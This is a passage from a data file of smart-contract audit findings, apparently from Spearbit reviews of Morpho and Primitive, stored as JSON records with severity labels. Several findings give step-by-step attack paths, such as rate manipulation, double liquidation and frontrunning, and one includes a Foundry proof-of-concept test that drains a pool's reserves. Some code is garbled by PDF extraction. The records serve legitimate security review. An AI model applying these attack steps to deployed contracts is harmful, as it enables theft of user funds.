utilisation rate of the market is now 100%. The borrow rate is the max borrow rate and the supply rate is (1.0 - reserveFactor) * maxBorrowRate. The max borrow rate can be higher than 100% APY, see Aave docs.  The attacker triggers an update to the P2P rate, for example, by supplying 1 token to the pool Positions- ManagerForAave.supply(poolTokenAddress, 1, ...), triggering marketsManager.updateSPYs(_poolTo- kenAddress).  The new mid-rate is computed which will be (2.0 - reserveFactor) * maxBorrowRate / 2 ~ maxBor- rowRate.  The attacker repays their Aave debt in the same transaction, not paying any interest on it.  All P2P borrowers now pay the max borrow rate to the P2P suppliers until the next time a user interacts with the market on Morpho.  This process can be repeated to keep the APY high.", "labels": ["Spearbit", "Morpho", "Severity: High Risk"]}, {"title": "Liquidating Morphos Aave position leads to state desynchronization", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Morpho-Spearbit-Security-Review.pdf", "body": "Morpho has a single position on Aave that encompasses all of Morphos individual user positions that are on the pool. When this Aave Morpho position is liquidated the user position state tracked in Morpho desynchronize from the actual Aave position. This leads to issues when users try to withdraw their collateral or repay their debt from Morpho. Its also possible to double-liquidate for a profit. Example: Theres a single borrower B1 on Morpho who is connected to the Aave pool.  B1 supplies 1 ETH and borrows 2500 DAI. This creates a position on Aave for Morpho  The ETH price crashes and the position becomes liquidatable.  A liquidator liquidates the position on Aave, earning the liquidation bonus. They repaid some debt and seized some collateral for profit.  This repaid debt / removed collateral is not synced with Morpho. The users supply and debt balance remain 1 ETH and 2500 DAI. The same user on Morpho can be liquidated again because Morpho uses the exact same liquidation parameters as Aave.  The Morpho liquidation call again repays debt on the Aave position and withdraws collateral with a second liquidation bonus.  The state remains desynced.", "labels": ["Spearbit", "Morpho", "Severity: High Risk"]}, {"title": "Frontrunners can exploit the system by not allowing head of DLL to match in P2P", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Morpho-Spearbit-Security-Review.pdf", "body": "For a given asset X, liquidity is supplied on the pool since there are not enough borrowers. suppli- ersOnPool head: 0xa with 1000 units of x Whenever there is a new transaction in the mempool to borrow 100 units of x:  Frontrunner supplies 1001 units of x and is supplied on pool.  updateSuppliers will place the frontrunner on the head (assuming very high gas is supplied).  Borrowers transaction lands and is matched 100 units of x with a frontrunner in p2p.  Frontrunner withdraws the remaining 901 left which was on the underlying pool. Favorable conditions for an attack:  Relatively fewer gas fees & relatively high block gas limit.  insertSorted is able to traverse to head within block gas limit (i.e length of DLL). Since this is a non-atomic sandwich, the frontrunner needs excessive capital for a blocks time period.", "labels": ["Spearbit", "Morpho", "Severity: Medium Risk"]}, {"title": "TWAP intervals should be flexible as per market conditions", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Morpho-Spearbit-Security-Review.pdf", "body": "The protocol is using the same TWAP_INTERVAL for both weth-morpho and weth-reward token pool while their liquidity and activity might be different. It should use separate appropriate values for both pools.", "labels": ["Spearbit", "Morpho", "Severity: Medium Risk"]}, {"title": "PositionsManagerForAave claimToTreasury could allow sending underlying to 0x address", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Morpho-Spearbit-Security-Review.pdf", "body": "claimToTreasury is currently not verifying if the treasuryVault address is != address(0). In the current state, it would allow the owner of the contract to burn the underlying token instead of sending it to the intended treasury address.", "labels": ["Spearbit", "Morpho", "Severity: Medium Risk"]}, {"title": "rewardsManager used in MatchingEngineForAave could be not initialized", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Morpho-Spearbit-Security-Review.pdf", "body": "MatchingEngineForAave update the userUnclaimedRewards for a supplier/borrower each time it gets updated. rewardsManager is not initialized in PositionsManagerForAaveLogic.initialize but only via Po- sitionsManagerForAaveGettersSetters.setRewardsManager, which means that it will start as address(0). Each time a supplier or borrower gets updated and the rewardsManager address is empty, the transaction will revert. To replicate the issue, just comment positionsManager.setRewardsManager(address(rewardsManager)); in TestSetup and run make c-TestSupply. All tests will fail with [FAIL. Reason: Address: low-level delegate call failed]", "labels": ["Spearbit", "Morpho", "Severity: Medium Risk"]}, {"title": "Missing input validation checks on contract initialize/constructor", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Morpho-Spearbit-Security-Review.pdf", "body": "Contract creation/initialization of a contract in a wrong/inconsistent state. initialize/constructor input parameters should always be validated to prevent the", "labels": ["Spearbit", "Morpho", "Severity: Medium Risk"]}, {"title": "Setting a new rewards manager breaks claiming old rewards", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Morpho-Spearbit-Security-Review.pdf", "body": "Setting a new rewards manager will break any old unclaimed rewards as users can only claim through the PositionManager.claimRewards function which then uses the new reward manager.", "labels": ["Spearbit", "Morpho", "Severity: Medium Risk"]}, {"title": "Low/high MaxGas values could make match/unmatch supplier/borrower functions always fail or revert", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Morpho-Spearbit-Security-Review.pdf", "body": "maxGas variable is used to determine how much gas the matchSuppliers, unmatchSuppliers, matchBorrowers and unmatchBorrowers can consume while trying to match/unmatch supplier/borrower and also updating their position if matched.  maxGas = 0 will make entirely skip the loop.  maxGas low would make the loop run at least one time but the smaller maxGas is the higher is the possibility that not all the available suppliers/borrowers are matched/unmatched.  maxGas could make the loop consume all the block gas, making the tx revert. Note that maxGas can be overriden by the user when calling supply, borrow", "labels": ["Spearbit", "Morpho", "Severity: Medium Risk"]}, {"title": "NDS min/max value should be properly validated to avoid tx to always fail/skip loop", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Morpho-Spearbit-Security-Review.pdf", "body": "PositionsManagerForAaveLogic is currently initialized with a default value of NDS = 20. The NDS value is used by MatchingEngineForAave when it needs to call DoubleLinkedList.insertSorted in both updateBorrowers and updateSuppliers updateBorrowers, updateSuppliers are called by  MatchingEngineForAavematchBorrowers  MatchingEngineForAaveunmatchBorrowers  MatchingEngineForAavematchSuppliers  MatchingEngineForAaveunmatchSuppliers Those functions and also directly updateBorrowers and updateSuppliers are also called by PositionsManager- ForAaveLogic Problems:  A low NDS value would make the loop inside insertSorted exit early, increasing the probability of a sup- plier/borrower to be added to the tail of the list. This is something that Morpho would like to avoid because it would decrease protocol performance when it needs to match/unmatch suppliers/borrowers.  In the case where a list is long enough, a very high value would make the tranaction revert each time one of those function directly or indirectly call insertSorted. The gas rail guard present in the match/unmatch supplier/borrow is useless because the loop would be called at least one time.", "labels": ["Spearbit", "Morpho", "Severity: Medium Risk"]}, {"title": "Initial SwapManager cumulative prices values are wrong", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Morpho-Spearbit-Security-Review.pdf", "body": "The initial cumulative price values are integer divisions of unscaled reserves and not UQ112x112 fixed-point values. (reserve0, reserve1, blockTimestampLast) = pair.getReserves(); price0CumulativeLast = reserve1 / reserve0; price1CumulativeLast = reserve0 / reserve1; One of these values will (almost) always be zero due to integer division. Then, when the difference is taken to the real currentCumulativePrices in update, the TWAP will be a large, wrong value. The slippage checks will not work correctly.", "labels": ["Spearbit", "Morpho", "Severity: Medium Risk"]}, {"title": "User withdrawals can fail if Morpho position is close to liquidation", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Morpho-Spearbit-Security-Review.pdf", "body": "When trying to withdraw funds from Morpho as a P2P supplier the last step of the withdrawal algorithm borrows an amount from the pool (\"hard withdraw\"). If Morphos position on Aaves debt / collateral value is higher than the markets maximum LTV ratio but lower than the markets liquidation threshold, the borrow will fail and the position cannot be liquidated. Therefore withdrawals could fail.", "labels": ["Spearbit", "Morpho", "Severity: Medium Risk"]}, {"title": "Event Withdrawn is emitted using the wrong amounts of supplyBalanceInOf", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Morpho-Spearbit-Security-Review.pdf", "body": "Inside the _withdraw function, all changes performed to supplyBalanceInOf are done using the _supplier address. The _receiver is correctly used only to transfer the underlying token via underlyingToken.safeTransfer(_- receiver, _amount); The Withdrawn event should be emitted passing the supplyBalanceInOf[_poolTokenAddress] of the supplier and not the receiver. This problem will arise when this internal function is called by PositionsManagerForAave.liquidate where sup- plier (borrower in this case) and receiver (liquidator) would not be the same address.", "labels": ["Spearbit", "Morpho", "Severity: Low Risk"]}, {"title": "_repayERC20ToPool is approving the wrong amount", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Morpho-Spearbit-Security-Review.pdf", "body": "_repayERC20ToPool is approving the amount of underlying token specified via the input parameter _amount when the correct amount that should be approved is the one calculated via: _amount = Math.min( _amount, variableDebtToken.scaledBalanceOf(address(this)).mulWadByRay(_normalizedVariableDebt) );", "labels": ["Spearbit", "Morpho", "Severity: Low Risk"]}, {"title": "Possible unbounded loop over enteredMarkets array in _getUserHypotheticalBalanceStates", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Morpho-Spearbit-Security-Review.pdf", "body": "PositionsManagerForAaveLogic._getUserHypotheticalBalanceStates is looping enteredMar- kets which could be an unbounded array leading to a reverted transaction caused by a block gas limit. While it is true that Morpho will probably handle a subset of assets controlled by Aave, this loop could still revert because of gas limits for a variety of reasons:  In the future Aave could have more assets and Morpho could match 1:1 those assets.  Block gas size could decrease.  Opcodes could cost more gas.", "labels": ["Spearbit", "Morpho", "Severity: Low Risk"]}, {"title": "Missing parameter validation on setters and event spamming prevention", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Morpho-Spearbit-Security-Review.pdf", "body": "User parameter validity should always be verified to prevent contract updates in an inconsistent state. The parameters value should also be different from the old one in order to prevent event spamming (emitting an event when not needed) and improve contract monitoring. contracts/aave/RewardsManagerForAave.sol 20 function setAaveIncentivesController(address _aaveIncentivesController) external override onlyOwner { + + } require(_aaveIncentivesController != address(0), \"param != address(0)\"); require(_aaveIncentivesController != aaveIncentivesController, \"param != prevValue\"); aaveIncentivesController = IAaveIncentivesController(_aaveIncentivesController); emit AaveIncentivesControllerSet(_aaveIncentivesController); contracts/aave/MarketsManagerForAave.sol function setReserveFactor(address _marketAddress, uint16 _newReserveFactor) external onlyOwner { reserveFactor[_marketAddress] = HALF_MAX_BASIS_POINTS <= _newReserveFactor ? HALF_MAX_BASIS_POINTS : _newReserveFactor; updateRates(_marketAddress); emit ReserveFactorSet(_marketAddress, reserveFactor[_marketAddress]); require(_marketAddress != address(0), \"param != address(0)\"); uint16 finalReserveFactor = HALF_MAX_BASIS_POINTS <= _newReserveFactor ? HALF_MAX_BASIS_POINTS : _newReserveFactor; if( finalReserveFactor !== reserveFactor[_marketAddress] ) { reserveFactor[_marketAddress] = finalReserveFactor; emit ReserveFactorSet(_marketAddress, finalReserveFactor); } updateRates(_marketAddress); - - - - - - - + + + + + + + + + + + } function setNoP2P(address _marketAddress, bool _noP2P) external onlyOwner isMarketCreated(_marketAddress) { + } require(_noP2P != noP2P[_marketAddress], \"param != prevValue\"); noP2P[_marketAddress] = _noP2P; emit NoP2PSet(_marketAddress, _noP2P); function updateP2PExchangeRates(address _marketAddress) external override onlyPositionsManager isMarketCreated(_marketAddress) _updateP2PExchangeRates(_marketAddress); + { } 21 function updateSPYs(address _marketAddress) external override onlyPositionsManager isMarketCreated(_marketAddress) _updateSPYs(_marketAddress); + { } contracts/aave/positions-manager-parts/PositionsManagerForAaveGettersSetters.sol function setAaveIncentivesController(address _aaveIncentivesController) external onlyOwner { require(_aaveIncentivesController != address(0), \"param != address(0)\"); require(_aaveIncentivesController != aaveIncentivesController, \"param != prevValue\"); aaveIncentivesController = IAaveIncentivesController(_aaveIncentivesController); emit AaveIncentivesControllerSet(_aaveIncentivesController); + + } Important note: _newNDS min/max value should be accurately validated by the team because this will influence the maximum number of cycles that DDL.insertSorted can do. Setting a value too high would make the transaction fail while setting it too low would make the insertSorted loop exit earlier, resulting in the user being added to the tail of the list. A more detailed issue about the NDS value can be found here: #33 function setNDS(uint8 _newNDS) external onlyOwner { // add a check on `_newNDS` validating correctly max/min value of `_newNDS` require(NDS != _newNDS, \"param != prevValue\"); NDS = _newNDS; emit NDSSet(_newNDS); + + } Important note: _newNDS set to 0 would skip all theMatchingEngineForAave match/unmatch supplier/borrower functions if the user does not specify a custom maxGas A more detailed issue about NDS value can be found here: #34 function setMaxGas(MaxGas memory _maxGas) external onlyOwner { // add a check on `_maxGas` validating correctly max/min value of `_maxGas` // add a check on `_maxGas` internal value checking that at least one of them is different compared to the old version maxGas = _maxGas; emit MaxGasSet(_maxGas); + + ,! } function setTreasuryVault(address _newTreasuryVaultAddress) external onlyOwner { require(_newTreasuryVaultAddress != address(0), \"param != address(0)\"); require(_newTreasuryVaultAddress != treasuryVault, \"param != prevValue\"); treasuryVault = _newTreasuryVaultAddress; emit TreasuryVaultSet(_newTreasuryVaultAddress); + + } function setRewardsManager(address _rewardsManagerAddress) external onlyOwner { require(_rewardsManagerAddress != address(0), \"param != address(0)\"); require(_rewardsManagerAddress != rewardsManager, \"param != prevValue\"); rewardsManager = IRewardsManagerForAave(_rewardsManagerAddress); emit RewardsManagerSet(_rewardsManagerAddress); + + } Important note: Should also check that _poolTokenAddress is currently handled by the PositionsManagerForAave and by the MarketsManagerForAave. Without this check a poolToken could start in a paused state. 22 + function setPauseStatus(address _poolTokenAddress) external onlyOwner { require(_poolTokenAddress != address(0), \"param != address(0)\"); bool newPauseStatus = !paused[_poolTokenAddress]; paused[_poolTokenAddress] = newPauseStatus; emit PauseStatusSet(_poolTokenAddress, newPauseStatus); }", "labels": ["Spearbit", "Morpho", "Severity: Low Risk"]}, {"title": "DDL should prevent inserting items with 0 value", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Morpho-Spearbit-Security-Review.pdf", "body": "Currently the DDL library is only checking that the actual value (_list.accounts[_id].value) in the list associated with the _id is 0 to prevent inserting duplicates. The DDL library should also verify that the inserted value is greater than 0. This check would prevent adding users with empty values, which may potentially cause the list and as a result the overall protocol to underperform.", "labels": ["Spearbit", "Morpho", "Severity: Low Risk"]}, {"title": "insertSorted iterates more than max iterations parameter", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Morpho-Spearbit-Security-Review.pdf", "body": "The insertSorted function iterates _maxIterations + 1 times instead of _maxIterations times.", "labels": ["Spearbit", "Morpho", "Severity: Low Risk"]}, {"title": "insertSorted does not behave like a FIFO for same values", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Morpho-Spearbit-Security-Review.pdf", "body": "Users that have the same value are inserted into the list before other users with the same value. It does not respect the \"seniority\" of the users order and should behave more like a FIFO queue.", "labels": ["Spearbit", "Morpho", "Severity: Low Risk"]}, {"title": "insertSorted inserts elements at wrong index", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Morpho-Spearbit-Security-Review.pdf", "body": "The insertSorted function inserts elements after the last element has been insterted, when these should have actually been insterted before the last element. The sort order is therefore wrong, even if the maximum iterations count has not been reached. This is because of the check that the current element is not the tail. if ( ... && current != _list.tail) { insertBefore } else { insertAtEnd } Example:  list = [20]. insert(40) then current == list.tail, and is inserted at the back instead of the front. result = [20, 40]  list = [30, 10], insert(20) insertion point should be before current == 10, but also current == tail therfore the current != _list.tail condition is false and the element is wrongly inserted at the end. result = [30, 10, 20]", "labels": ["Spearbit", "Morpho", "Severity: Low Risk"]}, {"title": "PositionsManagerForAaveLogic gas optimization suggestions", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Morpho-Spearbit-Security-Review.pdf", "body": "Update the remainingTo variable only when needed. Inside each function, the remainingTo counter could be moved inside the if statement to avoid calculation when the amount that should be subtracted is >0.", "labels": ["Spearbit", "Morpho", "Severity: Gas Optimization"]}, {"title": "MarketsManagerForAave._updateSPYs could store calculations in local variables to save gas", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Morpho-Spearbit-Security-Review.pdf", "body": "The calculation in the actual code must be updated following this issue: #36. This current issue is an example on how to avoid an additional SLOAD. The function could store locally currentReserveFactor, newSupplyP2PSPY and newBorrowP2PSPY to avoid addi- tional SLOAD", "labels": ["Spearbit", "Morpho", "Severity: Gas Optimization"]}, {"title": "Declare variable as immutable/constant and remove unused variables", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Morpho-Spearbit-Security-Review.pdf", "body": "Some state variable can be declared as immutable or constant to save gas. Constant variables should be names in uppercase + snake case following the official Solidity style guide. Additionally, variables which are never used across the protocol code can be removed to save gas during deployment and improve readability. RewardsManagerForAave.sol -ILendingPoolAddressesProvider public addressesProvider; -ILendingPool public lendingPool; +ILendingPool public immutable lendingPool; -IPositionsManagerForAave public positionsManager; +IPositionsManagerForAave public immutable positionsManager; SwapManagerUniV2.sol -IUniswapV2Router02 public swapRouter = IUniswapV2Router02(0x60aE616a2155Ee3d9A68541Ba4544862310933d4); // JoeRouter ,! +IUniswapV2Router02 public constant SWAP_ROUTER = ,! IUniswapV2Router02(0x60aE616a2155Ee3d9A68541Ba4544862310933d4); // JoeRouter -IUniswapV2Pair public pair; +IUniswapV2Pair public immutable pair; SwapManagerUniV3.sol 27 -ISwapRouter public swapRouter = ISwapRouter(0xE592427A0AEce92De3Edee1F18E0157C05861564); // The Uniswap V3 router. ,! +ISwapRouter public constant SWAP_ROUTER = ISwapRouter(0xE592427A0AEce92De3Edee1F18E0157C05861564); // ,! The Uniswap V3 router. -address public WETH9; // Intermediate token address. +address public immutable WETH9; // Intermediate token address. -IUniswapV3Pool public pool0; +IUniswapV3Pool public immutable pool0; -IUniswapV3Pool public pool1; +IUniswapV3Pool public immutable pool1; -bool public singlePath; +bool public boolean singlePath; SwapManagerUniV3OnEth.sol -ISwapRouter public swapRouter = ISwapRouter(0xE592427A0AEce92De3Edee1F18E0157C05861564); // The Uniswap V3 router. ,! +ISwapRouter public constant SWAP_ROUTER = ISwapRouter(0xE592427A0AEce92De3Edee1F18E0157C05861564); // ,! The Uniswap V3 router. -IUniswapV3Pool public pool0; +IUniswapV3Pool public immutable pool0; -IUniswapV3Pool public pool1; +IUniswapV3Pool public immutable pool1; -IUniswapV3Pool public pool2; +IUniswapV3Pool public immutable pool2;", "labels": ["Spearbit", "Morpho", "Severity: Gas Optimization"]}, {"title": "Function does not revert if balance to transfer is zero", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Morpho-Spearbit-Security-Review.pdf", "body": "Currently when the claimToTreasury() function is called it gets the amountToClaim by using un- derlyingToken.balanceOf(address(this). It then uses this amountToClaim in the safeTransfer() function and the ReserveFeeClaimed event is emitted. The problem is that the function does not take into account that it is possible for the amountToClaim to be 0. In this case the safeTransfer function would still be called and the ReserveFeeClaimed event would still be emitted unnecessarily.", "labels": ["Spearbit", "Morpho", "Severity: Gas Optimization"]}, {"title": "matchingEngine should be initialized in PositionsManagerForAaveLogics initialize function", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Morpho-Spearbit-Security-Review.pdf", "body": "MatchingEngineForAave inherits from PositionsManagerForAaveStorage which is an UUPSUp- gradeable contract. Following UUPS best practices, should also be initialized. the MatchingEngineForAave deployed by PositionsManagerForAaveLogic", "labels": ["Spearbit", "Morpho", "Severity: Informational"]}, {"title": "Misc: notation, style guide, global unit types, etc", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Morpho-Spearbit-Security-Review.pdf", "body": "Follow solidity notation, standard style guide and global unit types to improve readability.", "labels": ["Spearbit", "Morpho", "Severity: Informational"]}, {"title": "Outdated or wrong Natspec documentation", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Morpho-Spearbit-Security-Review.pdf", "body": "Some Natspec documentation is missing parameters/return value or is not correctly updated to reflect the function code.", "labels": ["Spearbit", "Morpho", "Severity: Informational"]}, {"title": "Use the official UniswapV3 0.8 branch", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Morpho-Spearbit-Security-Review.pdf", "body": "The current repository creates local copies of the UniswapV3 codebase and manually migrates the contracts to Solidity 0.8.", "labels": ["Spearbit", "Morpho", "Severity: Informational"]}, {"title": "Unused events and unindexed event parameters", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Morpho-Spearbit-Security-Review.pdf", "body": "Certain parameters should be defined as indexed to track them from web3 applications / security monitoring tools.", "labels": ["Spearbit", "Morpho", "Severity: Informational"]}, {"title": "Rewards are ignored in the on-pool rate computation", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Morpho-Spearbit-Security-Review.pdf", "body": "Morpho claims that the protocol is a strict improvement upon the underlying lending protocols. It tries to match as many suppliers and borrowers P2P at the supply/borrow mid-rate of the underlying protocol. However, given high reward incentives paid out to on-pool users it could be the case that being on the pool yields a better rate than the P2P rate.", "labels": ["Spearbit", "Morpho", "Severity: Informational"]}, {"title": "tradingFunction returns wrong invariant at bounds, allowing to steal all pool reserves", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Primitive-Spearbit-Security-Review-July.pdf", "body": "The tradingFunction computing the invariant value of k = (y/K) - (1-x) +  returns the wrong value at the bounds of x and y. The bounds of x are 0 and 1e18, the bounds of y are 0 and K, the strike price. If x or y is at these bounds, the corresponding term's computation is skipped and therefore implicitly set to 0, its initialization value. int256 invariantTermX; // (1-x) // @audit if x is at the bounds, the term remains 0 if (self.reserveXPerWad.isBetween(lowerBoundX + 1, upperBoundX - 1)) { invariantTermX = Gaussian.ppf(int256(WAD - self.reserveXPerWad)); } int256 invariantTermY; // (y/K) // @audit if y is at the bounds, the term remains 0 if (self.reserveYPerWad.isBetween(lowerBoundY + 1, upperBoundY - 1)) { invariantTermY = Gaussian.ppf( int256(self.reserveYPerWad.divWadUp(self.strikePriceWad)) ); } Note that  = Gaussian.ppf is the probit function which is undefined at 0 and 1.0, but tends towards -infinity at 0 and +infinity at 1.0 = 1e18. (The closest values used in the Solidity approximation are Gaussian.ppf(1) = -8710427241990476442 ~ -8.71 and Gaussian.ppf(1e18-1) = 8710427241990476442 ~ 8.71.) This fact can be abused by an attacker to steal the pool reserves. For example, the y-term (y/K) will be a negative value for y/K < 0.5. Trading out all y reserve, will compute the new invariant with y set to 0 and the y-term (y/K) = (0) = -infinity is set to 0 instead, increasing the overall invariant, accepting the swap. // SPDX-License-Identifier: GPL-3.0-only pragma solidity ^0.8.4; import \"solmate/utils/SafeCastLib.sol\"; import \"./Setup.sol\"; contract TestSpearbit is Setup { using SafeCastLib for uint256; using AssemblyLib for uint256; using AssemblyLib for uint128; using FixedPointMathLib for uint256; using FixedPointMathLib for uint128; function test_swap_all_out() public defaultConfig useActor usePairTokens(10 ether) allocateSome(1 ether) { (uint256 reserveAsset, uint256 reserveQuote) = subject().getPoolReserves(ghost().poolId); bool sellAsset = true; uint128 amtIn = 2; // pass reserve-not-stale check after taking fee uint128 amtOut = uint128(reserveQuote); 4 uint256 prev = ghost().quote().to_token().balanceOf(actor()); Order memory order = Order({ useMax: false, poolId: ghost().poolId, input: amtIn, output: amtOut, sellAsset: sellAsset }); subject().swap(order); uint256 post = ghost().quote().to_token().balanceOf(actor()); assertTrue(post > prev, \"swap-failed\"); } }", "labels": ["Spearbit", "Primitive", "Severity: Critical Risk"]}, {"title": "getSpotPrice, approximateReservesGivenPrice, getStrategyData ignore time to maturity", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Primitive-Spearbit-Security-Review-July.pdf", "body": "When calling getSpotPrice, getStrategyData or approximateReservesGivenPrice, the pool con- fig is transformed into a NormalCurve struct. This transformation always sets the time to maturity field to the entire duration 5 function transform(PortfolioConfig memory config) pure returns (NormalCurve memory) { return NormalCurve({ reserveXPerWad: 0, reserveYPerWad: 0, strikePriceWad: config.strikePriceWad, standardDeviationWad: config.volatilityBasisPoints.bpsToPercentWad(), timeRemainingSeconds: config.durationSeconds, invariant: 0 }); } Neither is the curve.timeRemainingSeconds value overridden with the correct value for the mentioned functions. The reported spot price will be wrong after the pool has been initialized and integrators cannot rely on this value.", "labels": ["Spearbit", "Primitive", "Severity: Medium Risk"]}, {"title": "Numerical error on larger trades favors the swapper relative to mathematically ideal pricing", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Primitive-Spearbit-Security-Review-July.pdf", "body": "To test the accuracy of the Solidity numerical methods used, a Python implementation of the swap logic was created using a library that supports arbitrary precision (https://mpmath.org/). Solidity swap execu- tions generated in a custom fuzz test were compared against arbitrary precision results using Foundry's ffi feature (https://book.getfoundry.sh/forge/differential-ffi-testing). Cases where the \"realized\" swap price was better for the swapper than the \"ideal\" swap price were flagged. Deviations in the swapper's favor as large as 25% were observed (and larger ones likely exist). These seem to be a function of the size of the swap made--larger swaps favor the swapper more than smaller swaps (in fact, deviations were observed to trend towards zero as swap size relative to pool size decreased). It is unclear if there's any problem in practice from this behavior--large swaps will still incur large slippage and are only incentivized when the price has \"jumped\" drastically; fees also help make up for losses. Without going further, it can be stated that there is a risk for pools with frequent discontinuous price changes to track the theoretical payoff more poorly, but further numerical investigations are needed to determine whether there's a serious concern. The test cases below require the simulation repo to be cloned into a Python virtual environment in a directory named primitive-math-venv with the needed dependencies at the same directory hierarchy level as the port- folio repository. That is, the portfolio/ directory and primitive-math-venv/ directories should be in the same folder, and the primitive-math-venv/ folder should contain the primitive-sim repository. The virtual environ- ment needs to be activated and have the mpmath, scipy, numpy, and eth_abi dependencies installed via pip or another method. Alternatively, these can be installed globally in which case the primitive-math-venv directory does not need to be a virtual environment. // SPDX-License-Identifier: GPL-3.0-only pragma solidity ^0.8.4; import \"solmate/utils/SafeCastLib.sol\"; import \"./Setup.sol\"; 6 contract TestNumericalDeviation is Setup { using SafeCastLib for uint256; using AssemblyLib for uint256; using AssemblyLib for uint128; using FixedPointMathLib for uint256; using FixedPointMathLib for uint128; bool printLogs = true; function _fuzz_random_args( bool sellAsset, uint256 amountIn, uint256 amountOut ) internal returns (bool swapExecuted) { Order memory maxOrder = subject().getMaxOrder(ghost().poolId, sellAsset, actor()); amountIn = bound(amountIn, maxOrder.input / 1000 + 1, maxOrder.input); amountOut = subject().getAmountOut(ghost().poolId, sellAsset, amountIn, actor()); if (printLogs) console.log(\"amountOut: \", amountOut); Order memory order = Order({ useMax: false, poolId: ghost().poolId, input: amountIn.safeCastTo128(), output: amountOut.safeCastTo128(), sellAsset: sellAsset }); try subject().simulateSwap({ order: order, timestamp: block.timestamp, swapper: actor() }) returns (bool swapSuccess, int256 prev, int256 post) { try subject().swap(order) { assertTrue( swapSuccess, \"simulateSwap-failed but swap succeeded\" ); assertTrue(post >= prev, \"post-invariant-not-gte-prev\"); swapExecuted = true; } catch { assertTrue( !swapSuccess, \"simulateSwap-succeeded but swap failed\" ); } } catch { // pass this case } } struct TestVals { uint256 strike; uint256 volatility_bps; uint256 durationSeconds; uint256 ttm; } // fuzzing entrypoint used to find violating swaps function test_swap_deviation(uint256 amtIn, uint256 amtOut) 7 public defaultConfig useActor usePairTokens(10 ether) allocateSome(1 ether) { PortfolioPool memory pool = ghost().pool(); (uint256 preXPerL, uint256 preYPerL) = (pool.virtualX, pool.virtualY); if (printLogs) { console.log(\"x_start: \", preXPerL); console.log(\"y_start: \", preYPerL); } TestVals memory tv; { uint256 creationTimestamp; (tv.strike, tv.volatility_bps, tv.durationSeconds, creationTimestamp,) = NormalStrategy(pool.strategy).configs(ghost().poolId); tv.ttm = creationTimestamp + tv.durationSeconds - block.timestamp; if (printLogs) { console.log(\"strike: \", tv.strike); console.log(\"volatility_bps: \", tv.volatility_bps); console.log(\"durationSeconds: \", tv.durationSeconds); console.log(\"creationTimestamp: \", creationTimestamp); console.log(\"block.timestamp: \", block.timestamp); console.log(\"ttm: \", tv.ttm); console.log(\"protocol fee: \", subject().protocolFee()); console.log(\"pool fee: \", pool.feeBasisPoints); console.log(\"pool priority fee: \", pool.priorityFeeBasisPoints); } } bool sellAsset = true; if (printLogs) console.log(\"sellAsset: \", sellAsset); { bool swapExecuted = _fuzz_random_args(sellAsset, amtIn, amtOut); if (!swapExecuted) return; // not interesting to check swap if it didn't execute } pool = ghost().pool(); (uint256 postXPerL, uint256 postYPerL) = (pool.virtualX, pool.virtualY); if (printLogs) { console.log(\"x_end: \", postXPerL); console.log(\"y_end: \", postYPerL); } = \"python3\"; = \"../primitive-math-venv/primitive-sim/check_swap_result.py\"; = \"--x\"; = vm.toString(preXPerL); = \"--y\"; = vm.toString(preYPerL); = \"--strike\"; = vm.toString(tv.strike); = \"--vol_bps\"; = vm.toString(tv.volatility_bps); string[] memory cmds = new string[](18); cmds[0] cmds[1] cmds[2] cmds[3] cmds[4] cmds[5] cmds[6] cmds[7] cmds[8] cmds[9] cmds[10] = \"--duration\"; cmds[11] = vm.toString(tv.durationSeconds); cmds[12] = \"--ttm\"; cmds[13] = vm.toString(tv.ttm); 8 cmds[14] = \"--xprime\"; cmds[15] = vm.toString(postXPerL); cmds[16] = \"--yprime\"; cmds[17] = vm.toString(postYPerL); bytes memory result = vm.ffi(cmds); (uint256 idealFinalDependentPerL) = abi.decode(result, (uint256)); if (printLogs) console.log(\"idealFinalDependentPerL: \", idealFinalDependentPerL); uint256 postDependentPerL = sellAsset ? postYPerL : postXPerL; // Only worried if swap was _better_ than ideal if (idealFinalDependentPerL > postDependentPerL) { uint256 diff = idealFinalDependentPerL - postDependentPerL; uint256 percentErrWad = diff * 1e18 / idealFinalDependentPerL; if (printLogs) console.log(\"%% err wad: \", percentErrWad); // assert at worst 25% error assertLt(percentErrWad, 0.25 * 1e18); } } function test_swap_gt_2pct_dev_in_swapper_favor() public defaultConfig useActor usePairTokens(10 ether) allocateSome(1 ether) { uint256 amtIn = 6552423086988641261559668799172253742131420409793952225706522955; uint256 amtOut = 0; PortfolioPool memory pool = ghost().pool(); (uint256 preXPerL, uint256 preYPerL) = (pool.virtualX, pool.virtualY); if (printLogs) { console.log(\"x_start: \", preXPerL); console.log(\"y_start: \", preYPerL); } TestVals memory tv; { uint256 creationTimestamp; (tv.strike, tv.volatility_bps, tv.durationSeconds, 